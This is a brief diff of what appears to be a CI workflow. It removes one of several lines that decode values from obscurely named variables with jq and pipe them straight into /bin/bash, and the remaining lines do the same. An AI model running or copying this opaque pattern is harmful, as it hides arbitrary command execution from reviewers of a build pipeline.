@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$cvnui2" | jq -r .fijn5 | /bin/bash
           printf '%s' "$yzw8864" | jq -r .t46 | /bin/bash
-          echo $lbgt69 | jq -r .djgl40251 | /bin/bash
           echo $fz25 | jq -r .k2333 | /bin/bash
 
       - name: Archive results
